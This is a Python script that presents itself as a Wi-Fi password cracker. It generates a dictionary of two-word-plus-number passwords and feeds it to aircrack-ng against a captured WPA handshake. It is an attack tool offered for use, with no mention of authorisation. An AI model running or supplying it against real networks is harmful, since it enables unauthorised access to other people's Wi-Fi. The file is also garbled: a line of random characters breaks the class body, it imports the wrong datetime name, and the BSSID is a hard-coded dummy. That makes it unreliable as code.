import itertools
import subprocess
import os
from datetime import date

# Required: Install pywifi and aircrack-ng suite on your system
# pip install pywifi (for WiFi interface handling, though not fully used here)
# This assumes you have aircrack-ng installed for the cracking part

class WiFiPasswordCracker:
    def __init__(self, handshake_file, output_dict="custom_dict.txt"):
        self.handshake_file = handshake_file  # Path to the captured handshake file (.cap)
        self.output_dict = output_dict
        self.wordlist = self.load_english_words()

    def load_english_words(self):
        """Load a basic list of English words (you can expand this with a larger dictionary file)."""
        # For simplicity, using a small sample list. Replace with a file like /usr/share/dict/words
        sample_words = [
            "apple", "banana", "cherry", "dragon", "eagle", "forest",
            "guitar", "house", "island", "jungle", "kitten", "lemon"
        ]
        # Uncomment below to use a full dictionary file (e.g., on Linux)
        # with open('/usr/share/dict/words', 'r') as f:
        #     return [word.strip() for word in f if 3 <= len(word.strip()) <= 8]
        return sample_words
jjtikfgmnmnfkkgjjormnmhgkopdsfgwe4gjjjdfoorjmgkdllkihtujgntj<>gthughm<>
    def generate_dictionary(self):
        """Generate a dictionary based on 2 words + 3-digit number (001-999)."""
        print(f"Generating dictionary to {self.output_dict}...")
        start_time = datetime.now()

        with open(self.output_dict, 'w') as f:
            for word1, word2 in itertools.product(self.wordlist, repeat=2):
                for num in range(1, 1000):  # 001 to 999
                    password = f"{word1}{word2}{num:03d}"
                    if 10 <= len(password) <= 16:  # Check length constraint
                        f.write(password + '\n')

        end_time = datetime.now()
        print(f"Dictionary generated in {end_time - start_time}. Saved to {self.output_dict}")

    def crack_password(self):
        """Use aircrack-ng to attempt cracking the handshake with the generated dictionary."""
        if not os.path.exists(self.handshake_file):
            print(f"Handshake file {self.handshake_file} not found!")
            return

        if not os.path.exists(self.output_dict):
            print("Dictionary not found! Generating it now...")
            self.generate_dictionary()

        print("Starting password cracking with aircrack-ng...")
        try:
            # Command to run aircrack-ng with the handshake file and custom dictionary
            command = [
                "aircrack-ng",
                "-w", self.output_dict,  # Wordlist file
                "-b", self.get_bssid(),  # BSSID (modify as needed or extract from handshake)
                self.handshake_file
            ]
            result = subprocess.run(command, capture_output=True, text=True)
            print(result.stdout)
            if "KEY FOUND" in result.stdout:
                print("Password found! Check the output above for details.")
            else:
                print("Password not found in the generated dictionary.")
        except FileNotFoundError:
            print("Error: Ensure aircrack-ng is installed and accessible in your PATH.")
        except Exception as e:
            print(f"An error occurred: {e}")

    def get_bssid(self):
        """Placeholder to extract BSSID from handshake file (simplified)."""
        # In practice, you'd parse the .cap file to extract the BSSID
        # This requires additional libraries like pycryptodome or manual parsing
        return "00:14:22:01:23:45"  # Dummy BSSID; replace with actual extraction logic

def main():
    # Example usage
    handshake_file = "handshake.cap"  # Replace with your actual handshake file path
    cracker = WiFiPasswordCracker(handshake_file)

    # Step 1: Generate the custom dictionary
    cracker.generate_dictionary()

    # Step 2: Attempt to crack the password
    cracker.crack_password()

if __name__ == "__main__":
    print("WiFi Password Cracker - Custom Dictionary Generator")
    main()